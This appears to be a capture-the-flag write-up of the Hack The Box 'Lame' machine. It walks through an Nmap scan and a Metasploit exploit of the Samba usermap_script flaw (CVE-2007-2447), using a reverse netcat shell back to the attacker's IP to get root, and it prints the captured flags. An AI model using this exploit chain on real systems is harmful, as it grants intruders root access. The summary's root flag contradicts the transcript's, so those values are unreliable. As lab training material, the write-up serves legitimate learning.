## Lame - Hack The Box Writeup

[Room Link](https://app.hackthebox.com/machines/1)

Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

**IP: 10.10.10.3**

**Replace [YOUR-HTB-IP] with your own machine IP assigned by Hack The Box.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Metasploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png"/>](https://github.com/mauzware)

[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan.

  ```
  $ nmap -sC -sV -p- 10.10.10.3

  PORT     STATE SERVICE     VERSION
  21/tcp   open  ftp         vsftpd 2.3.4
  |_ftp-anon: got code 500 "OOPS: cannot change directory:/home/ftp".
  22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
  |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
  3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  |_smb2-time: Protocol negotiation failed (SMB2)
  |_clock-skew: mean: 2h00m52s, deviation: 2h49m44s, median: 50s
  | smb-os-discovery: 
  |   OS: Unix (Samba 3.0.20-Debian)
  |   Computer name: lame
  |   NetBIOS computer name: 
  |   Domain name: hackthebox.gr
  |   FQDN: lame.hackthebox.gr
  |_  System time: 2025-06-11T16:47:16-04:00
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  ```
  
- Hmmmmm, no web app? Interesting. I also did `enum4linux` and tried to access some shares but it was unsuccessful.

---

## ⚙️ Shell Access

- So, I pivoted to Metasploit in order to find an exploit for `CVE-2007-2447` like it is provided in a hint. There is only one exploit found in Metasploit.

  ```
  msf6 > search CVE-2007-2447

  Matching Modules
  ================
  
     #  Name                                Disclosure Date  Rank       Check  Description
     -  ----                                ---------------  ----       -----  -----------
     0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

  msf6 > use 0
  [*] No payload configured, defaulting to cmd/unix/reverse_netcat
  msf6 exploit(multi/samba/usermap_script) > 
  
  msf6 exploit(multi/samba/usermap_script) > show options
  
  Module options (exploit/multi/samba/usermap_script):
  
     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     CHOST                     no        The local client address
     CPORT                     no        The local client port
     Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                         sics/using-metasploit.html
     RPORT    139              yes       The target port (TCP)
  
  
  Payload options (cmd/unix/reverse_netcat):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  [YOUR-HTB-IP]    yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   Automatic
  ```
  
- Now, fill all the parameters and run the exploit. You will get a root shell lol.

  ```
  msf6 exploit(multi/samba/usermap_script) > set LHOST [YOUR-HTB-IP]
  LHOST => [YOUR-HTB-IP]
  msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
  RHOSTS => 10.10.10.3
  msf6 exploit(multi/samba/usermap_script) > run
  [*] Started reverse TCP handler on [YOUR-HTB-IP]:4444 
  [*] Command shell session 1 opened ([YOUR-HTB-IP]:4444 -> 10.10.10.3:37837) at 2025-06-11 21:57:19 +0100
  
  whoami
  root
  id
  uid=0(root) gid=0(root)
  ```

---

## 👑 Flags

- Since we are already root, just read both flags. Cya in the next one!

  ```
  cd /home
  ls -al
  total 12
  drwxr-xr-x  3 root  root  4096 Jun 11 08:46 .
  drwxr-xr-x 21 root  root  4096 Oct 31  2020 ..
  drwxr-xr-x  2 makis makis 4096 Jun 11 08:46 makis
  
  cd makis
  ls -al
  total 12
  drwxr-xr-x 2 makis makis 4096 Jun 11 08:46 .
  drwxr-xr-x 3 root  root  4096 Jun 11 08:46 ..
  -rw-r--r-- 1 makis makis   33 Jun 11 00:02 user.txt
  
  cat user.txt    
  197ebb944a9b97112da2ab59e61a6c4d
  
  cat /root/root.txt
  d012057e617b0cadbdddd333372c7b1c
  ```

---

## 🏁 Flags

- **User Flag**: `197ebb944a9b97112da2ab59e61a6c4d`
- **Root Flag**: `197ebb944a9b97112da2ab59e61a6c4d`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing.`

- What did I learn?
  `Nothing new, just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
